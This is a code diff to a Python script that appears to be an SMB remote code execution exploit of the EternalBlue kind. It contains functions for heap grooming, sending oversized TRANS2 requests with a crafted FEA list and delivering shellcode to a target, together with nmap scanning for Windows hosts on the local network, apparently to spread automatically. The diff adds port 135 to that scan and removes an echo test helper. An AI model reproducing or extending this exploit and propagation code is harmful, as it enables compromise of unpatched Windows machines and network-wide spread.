@@ -109,7 +109,7 @@ def getLinuxHostsOnTheSameNetwork(ip, broadcast, network, cidr):
 
 def getWindowsHostsOnTheSameNetwork(ip, broadcast, network, cidr):
 	portScanner = nmap.PortScanner()
-	portScanner.scan( network + "/" + cidr, arguments = '-p 139,445 --open --exclude ' + ip + ',' + broadcast)	#Ref: https://nmap.org/book/man-target-specification.html
+	portScanner.scan( network + "/" + cidr, arguments = '-p 135,139,445 --open --exclude ' + ip + ',' + broadcast)	#Ref: https://nmap.org/book/man-target-specification.html
 	return portScanner.all_hosts()
 
 
@@ -284,27 +284,6 @@ Bug detail:
 def getNTStatus(self):
 	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
 setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)
-
-def sendEcho(conn, tid, data):
-	pkt = smb.NewSMBPacket()
-	pkt['Tid'] = tid
-
-	##test the transport layer connection with the server
-	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)						
-	transCommand['Parameters'] = smb.SMBEcho_Parameters()
-	transCommand['Data'] = smb.SMBEcho_Data()
-
-	transCommand['Parameters']['EchoCount'] = 1
-	transCommand['Data']['Data'] = data
-	pkt.addCommand(transCommand)
-
-	conn.sendSMB(pkt)
-	recvPkt = conn.recvSMB()
-	if recvPkt.getNTStatus() == 0:
-		print('got good ECHO response')
-	else:
-		print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))
-
 
 #####################################################################################################################################################################
 	# There is a bug in SMB_COM_SESSION_SETUP_ANDX command that allow us to allocate a big nonpaged pool.
@@ -575,10 +554,7 @@ def attackSMB(target, shellcode, numGroomConn):
 	# Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
 	progress = send_big_trans2(conn, tid, 0, feaList, '\x00'*30, 2000, False)
 	# we have to know what size of NtFeaList will be created when last fragment is sent
-
-	# make sure server recv all payload before starting allocate big NonPaged
-	#sendEcho(conn, tid, 'a'*12)
-
+	
 	# create buffer size NTFEA_SIZE-0x1000 at server
 	# this buffer MUST NOT be big enough for overflown buffer
 	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
@@ -601,9 +577,6 @@ def attackSMB(target, shellcode, numGroomConn):
 	for i in range(5):
 		sk = createConnectionWithBigSMBFirst80(target)
 		srvnetConn.append(sk)
-		
-	# send echo again, all new 5 srvnet buffers should be created
-	#sendEcho(conn, tid, 'a'*12)
 	
 	# remove holeConn to create hole for fea buffer
 	holeConn.get_socket().close()
